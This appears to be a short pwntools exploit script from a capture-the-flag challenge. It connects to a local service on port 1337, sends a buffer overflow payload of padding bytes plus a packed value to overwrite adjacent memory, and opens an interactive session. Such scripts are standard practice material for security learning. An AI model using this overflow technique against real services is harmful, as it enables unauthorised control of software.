from pwn import *

#p = process("./chall")

p = remote("0.0.0.0",1337)
payload = b"A"*(0x28-0xc) + p32(0x162e)
print(payload)
p.sendline(payload)
p.interactive()
